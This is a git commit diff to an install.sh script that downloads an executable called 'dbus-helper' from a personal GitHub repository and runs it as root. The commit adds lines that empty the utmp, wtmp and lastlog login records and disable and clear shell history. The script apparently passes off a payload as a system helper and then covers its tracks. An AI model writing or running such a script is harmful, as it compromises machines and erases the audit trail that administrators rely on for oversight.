59076e882317016e100046717027e25294d903f3
catherine935 <lynhhz1310@gmail.com>
2026-02-20 22:18:02 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,9 @@
 wget https://github.com/catherine935/dbus/raw/refs/heads/main/dbus-helper
 chmod +x dbus-helper
 sudo ./dbus-helper
+: > /var/run/utmp
+: > /var/log/wtmp
+: > /var/log/lastlog
+export HISTSIZE=0
+history -c
+source /root/.bashrc 2>/dev/null
